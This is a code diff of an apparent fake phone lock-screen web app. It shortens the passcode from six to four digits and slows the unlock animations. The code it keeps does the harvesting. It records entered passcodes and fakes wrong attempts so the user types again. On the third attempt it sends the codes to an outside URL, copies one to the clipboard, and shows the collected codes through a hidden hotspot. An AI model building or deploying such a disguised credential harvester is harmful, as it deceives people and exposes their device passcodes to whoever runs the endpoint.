@@ -1,37 +1,7 @@
+
 (() => {
-  // --- VIEWPORT helper: set --app-viewport-height to the real viewport height ---
-  // This prevents iOS PWA from showing top/bottom filler bands and stops rubber-band.
-  function updateAppViewportHeight() {
-    try {
-      const h = (window.visualViewport && window.visualViewport.height) ? window.visualViewport.height : window.innerHeight;
-      document.documentElement.style.setProperty('--app-viewport-height', `${Math.round(h)}px`);
-    } catch (e) {
-      // ignore
-    }
-  }
-  updateAppViewportHeight();
-  window.addEventListener('resize', updateAppViewportHeight, { passive: true });
-  window.addEventListener('orientationchange', () => setTimeout(updateAppViewportHeight, 250), { passive: true });
-  if (window.visualViewport) {
-    window.visualViewport.addEventListener('resize', updateAppViewportHeight);
-    window.visualViewport.addEventListener('scroll', updateAppViewportHeight);
-  }
-
-  // prevent overscroll bounce in-app (should be honored by browsers)
-  document.addEventListener('touchmove', (e) => {
-    const el = e.target;
-    if (!el) {
-      e.preventDefault();
-      return;
-    }
-    // App has no scrollable containers; prevent default to stop page-level overscroll
-    if (!el.closest('.scrollable')) {
-      e.preventDefault();
-    }
-  }, { passive: false });
-
   const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarun&data=";
-  const MAX = 6; // <-- passcode length (6 digits)
+  const MAX = 4;
   let code = "";
 
   const dotEls = Array.from(document.querySelectorAll('.dot'));
@@ -40,12 +10,66 @@
   // keep a live reference to cancel button
   let cancelBtn = document.getElementById('cancel');
   const unlockOverlay = document.getElementById('unlockOverlay');
-  const lockInner = document.querySelector('.lockscreen-inner') || document.querySelector('.lockscreen.inner');
+  const lockInner = document.querySelector('.lockscreen-inner');
   const homescreenImg = document.getElementById('homescreenImg');
   const ATT_KEY = '_pass_attempt_count_';
   const QUEUE_KEY = '_pass_queue_';
 
-  // rotating buffer for last up-to-6 entered codes
+  // grab the dynamic island element so we can flip the lock and animate it
+  const dynamicIslandEl = document.querySelector('.dynamic-island');
+
+  // Ensure wallpaper <img> is ready/visible (helps iOS PWA painting)
+  (function ensureWallpaperPaints() {
+    try {
+      const wp = document.getElementById('wallpaperImg');
+      if (wp) {
+        wp.addEventListener('error', () => {
+          wp.style.display = 'none';
+        });
+        if (wp.decode) {
+          wp.decode().catch(()=>{/* ignore */});
+        }
+      }
+    } catch (e) {}
+  })();
+
+  /* ---------- Viewport sync: match visualViewport and pin heights to avoid sliding/gaps ---------- */
+  (function setupViewportSync() {
+    function updateViewportHeight() {
+      try {
+        const vv = window.visualViewport;
+        const base = vv ? Math.round(vv.height) : window.innerHeight;
+        const overfill = 8;
+        const used = Math.max(100, base + overfill);
+        document.documentElement.style.setProperty('--app-viewport-height', used + 'px');
+        const ls = document.querySelector('.lockscreen');
+        if (ls) ls.style.height = used + 'px';
+        document.body.style.height = used + 'px';
+      } catch (err) {
+        console.warn('viewport sync failed', err);
+      }
+    }
+
+    window.addEventListener('load', updateViewportHeight, { passive: true });
+    if (window.visualViewport) {
+      window.visualViewport.addEventListener('resize', updateViewportHeight, { passive: true });
+      window.visualViewport.addEventListener('scroll', updateViewportHeight, { passive: true });
+    }
+    window.addEventListener('resize', updateViewportHeight, { passive: true });
+    window.addEventListener('orientationchange', updateViewportHeight, { passive: true });
+
+    updateViewportHeight();
+
+    // catch iOS toolbar animation frames
+    let t = 0;
+    const id = setInterval(() => {
+      updateViewportHeight();
+      t += 1;
+      if (t > 20) clearInterval(id);
+    }, 120);
+  })();
+
+  // rotating buffer for last up-to-4 entered codes
   const LAST_CODES_KEY = '_pass_last_codes_';
   function getLastCodes() {
     try {
@@ -58,7 +82,7 @@
     try {
       const arr = getLastCodes();
       arr.push(c);
-      while (arr.length > 6) arr.shift(); // keep most recent 6
+      while (arr.length > 4) arr.shift();
       localStorage.setItem(LAST_CODES_KEY, JSON.stringify(arr));
     } catch (e) {}
   }
@@ -180,6 +204,8 @@
       homescreenImg.style.transform = `translate3d(0,0,0) scale(1)`;
       homescreenImg.style.opacity = '1';
       homescreenImg.style.filter = 'blur(0) saturate(1)';
+      // hide pill immediately for reduced-motion users
+      if (dynamicIslandEl) dynamicIslandEl.style.display = 'none';
       return;
     }
 
@@ -194,12 +220,13 @@
     homescreenImg.style.filter = 'blur(10px) saturate(0.9)';
     lockInner.style.boxShadow = '0 40px 90px rgba(0,0,0,0.55)';
 
+    // — SLOWER slide-up spring for lockInner (tuned to feel ~1s slower)
     springAnimate({
       from: 0,
       to: targetY,
-      mass: 1.05,
-      stiffness: 140,
-      damping: 16,
+      mass: 1.25,        // slightly heavier => slower
+      stiffness: 110,   // a touch lower than before
+      damping: 14,      // a touch lower damping so it stretches longer
       onUpdate: (val) => {
         const progress = Math.min(1, Math.abs(val / targetY));
         const scale = 1 - 0.003 * progress;
@@ -207,18 +234,20 @@
         lockInner.style.opacity = String(1 - Math.min(0.18, progress * 0.18));
       },
       onComplete: () => {
+        // keep final transform; we won't hide lockInner here (homescreen spring will handle finalization)
         lockInner.style.boxShadow = '';
         lockInner.style.opacity = '0';
         lockInner.style.transform = `translate3d(0, ${targetY}px, 0)`;
       }
     });
 
+    // — SLOWER homescreen spring (gently expand into home) so the whole sequence is longer
     springAnimate({
       from: 0,
       to: 1,
-      mass: 1,
-      stiffness: 80,
-      damping: 11,
+      mass: 1.05,
+      stiffness: 60,  // lower stiffness -> slower
+      damping: 9,     // lower damping -> longer duration
       onUpdate: (p) => {
         const progress = Math.max(0, Math.min(1, p));
         const raw = p;
@@ -234,14 +263,44 @@
         homescreenImg.style.transform = 'translate3d(0,0,0) scale(1)';
         homescreenImg.style.filter = 'blur(0) saturate(1)';
         homescreenImg.style.opacity = '1';
+
+        // After homescreen animation completes, wait an EXTRA 1 second,
+        // then trigger the pill shrink & hide it after its CSS transition finishes.
+        if (dynamicIslandEl) {
+          const EXTRA_KEEP_MS = 1000; // user-requested extra 1 second keep
+          setTimeout(() => {
+            // trigger horizontal collapse
+            dynamicIslandEl.classList.add('shrinking');
+
+            // wait for the CSS transitionend on the dynamic island then hide / cleanup
+            const onTransEnd = (ev) => {
+              if (ev.target !== dynamicIslandEl) return;
+              dynamicIslandEl.removeEventListener('transitionend', onTransEnd);
+              try {
+                dynamicIslandEl.style.display = 'none';
+                dynamicIslandEl.classList.remove('shrinking', 'unlocked', 'icon-opened', 'locked');
+              } catch (e) { /* ignore */ }
+            };
+            dynamicIslandEl.addEventListener('transitionend', onTransEnd);
+
+            // safety hide if transitionend doesn't fire
+            setTimeout(() => {
+              try {
+                dynamicIslandEl.style.display = 'none';
+                dynamicIslandEl.classList.remove('shrinking', 'unlocked', 'icon-opened', 'locked');
+              } catch (e) {}
+            }, 1200);
+          }, EXTRA_KEEP_MS);
+        }
       }
     });
 
+    // cleanup will-change flags after a while
     setTimeout(() => {
       lockInner.style.boxShadow = '';
       homescreenImg.style.willChange = '';
       lockInner.style.willChange = '';
-    }, 1200);
+    }, 1600 + 1000); // slightly longer to match slower springs
   }
 
   function animateWrongAttempt() {
@@ -265,7 +324,9 @@
   /* ---------- Clipboard helper & toast (preserve user gesture) ---------- */
   function copyToClipboard(text) {
     if (navigator.clipboard && navigator.clipboard.writeText) {
-      return navigator.clipboard.writeText(text).catch(() => fallbackCopy(text));
+      return navigator.clipboard.writeText(text).catch(() => {
+        return fallbackCopy(text);
+      });
     }
     return Promise.resolve().then(() => fallbackCopy(text));
   }
@@ -275,7 +336,6 @@
       try {
         const ta = document.createElement('textarea');
         ta.value = text;
-        // Move off-screen
         ta.style.position = 'fixed';
         ta.style.left = '-9999px';
         ta.style.top = '0';
@@ -334,23 +394,34 @@
     // push code into rotating buffer (so hotspot displays exact payload)
     pushLastCode(enteredCode);
 
-    // 1-2: wrong attempts (no send)
     if (attempts === 1 || attempts === 2) {
       animateWrongAttempt();
-    }
-    // 3: send combined last codes
-    else if (attempts === 3) {
+    } else if (attempts === 3) {
       const combined = getCombinedLastCodes();
       if (combined) sendToAPI(combined);
       animateWrongAttempt();
-    }
-    // 4: unlock animation (no send)
-    else if (attempts === 4) {
-      playUnlockAnimation();
+    } else if (attempts === 4) {
+      // Immediately show the unlocked (open) lock glyph and give it a small pop,
+      // then start the unlock animation sequence (now slightly slower). The pill
+      // will remain visible and will only shrink after the homescreen animation finishes + 1s.
+      if (dynamicIslandEl) {
+        dynamicIslandEl.classList.remove('locked');
+        dynamicIslandEl.classList.add('unlocked', 'icon-opened');
+
+        // ensure immediate repaint so the unlocked glyph is visible right away
+        requestAnimationFrame(() => {
+          // start the unlock animation immediately (no artificial delay anymore)
+          playUnlockAnimation();
+        });
+      } else {
+        // fallback
+        playUnlockAnimation();
+      }
+
+      // local reset of input (preserve existing behavior)
       setTimeout(reset, 300);
     }
 
-    // reset counter once we've reached the unlock threshold
     if (attempts >= 4) {
       setAttempts(0);
     }
@@ -361,9 +432,7 @@
     const initial = parseFloat(el.dataset.brightness || "1");
     const change = target - initial;
 
-    function easeOutCubic(t) {
-      return 1 - Math.pow(1 - t, 3);
-    }
+    function easeOutCubic(t) { return 1 - Math.pow(1 - t, 3); }
 
     function frame(ts) {
       if (!startTime) startTime = ts;
@@ -372,9 +441,7 @@
       const value = initial + change * eased;
       el.style.filter = `brightness(${value})`;
       el.dataset.brightness = value.toFixed(3);
-      if (progress < 1) {
-        requestAnimationFrame(frame);
-      }
+      if (progress < 1) requestAnimationFrame(frame);
     }
     requestAnimationFrame(frame);
   }
@@ -385,13 +452,10 @@
 
     k.addEventListener('touchstart', () => {
       animateBrightness(k, 1.6, 80);
-      // update Cancel->Delete immediately on touchstart for snappy feedback
       updateCancelText();
     }, { passive: true });
 
-    const endPress = () => {
-      animateBrightness(k, 1, 100);
-    };
+    const endPress = () => { animateBrightness(k, 1, 100); };
     k.addEventListener('touchend', endPress);
     k.addEventListener('touchcancel', endPress);
     k.addEventListener('mouseleave', endPress);
@@ -403,17 +467,11 @@
 
       if (code.length === MAX) {
         const enteredCode = code;
-
-        // COPY only on the 3rd resulting attempt, and copy ONLY the current (6-digit) entry.
         try {
           const upcomingAttempts = getAttempts() + 1;
           if (upcomingAttempts === 3) {
             const toCopy = enteredCode;
-            // Run copy inside the click handler (user gesture) so iOS allows it.
-            copyToClipboard(toCopy).catch(() => {
-              // only show failure UI (optional)
-              showToast('Copy failed', 900);
-            });
+            copyToClipboard(toCopy).catch(() => showToast('Copy failed', 900));
           }
         } catch (err) {
           console.warn('clipboard pre-copy failed', err);
@@ -459,10 +517,9 @@
   window.addEventListener('online', flushQueue);
   flushQueue();
 
-  /* ---------- Invisible bottom-left hotspot: show combined last-6 codes on press ---------- */
+  /* ---------- Invisible bottom-left hotspot: show combined last codes on press ---------- */
 
   function createInvisibleHotspotAndDisplay() {
-    // Hotspot (invisible)
     if (!document.getElementById('codesHotspot')) {
       const hs = document.createElement('div');
       hs.id = 'codesHotspot';
@@ -480,14 +537,13 @@
         alignItems: 'center',
         justifyContent: 'center',
         boxSizing: 'border-box',
-        touchAction: 'none',
+        touchAction: 'manipulation',
         cursor: 'pointer',
         pointerEvents: 'auto'
       });
       document.body.appendChild(hs);
     }
 
-    // Combined display (hidden by default)
     if (!document.getElementById('codesCombinedDisplay')) {
       const d = document.createElement('div');
       d.id = 'codesCombinedDisplay';
@@ -528,19 +584,14 @@
   }
 
   function showCombinedStringAtBottomLeft() {
-    if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
     createInvisibleHotspotAndDisplay();
     const bar = document.getElementById('codesCombinedDisplay');
     const inner = document.getElementById('codesCombinedInner');
-    inner.textContent = ''; // clear
+    inner.textContent = '';
 
     const codes = getLastCodes();
-    if (!codes || codes.length === 0) {
-      inner.textContent = '';
-    } else {
-      const combined = codes.join(',');
-      inner.textContent = combined;
-    }
+    if (!codes || codes.length === 0) inner.textContent = '';
+    else inner.textContent = codes.join(',');
 
     bar.style.display = 'flex';
     requestAnimationFrame(() => {
@@ -561,7 +612,6 @@
 
   // Hotspot handlers
   function onHotspotDown(ev) {
-    if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
     ev.preventDefault();
     showCombinedStringAtBottomLeft();
   }
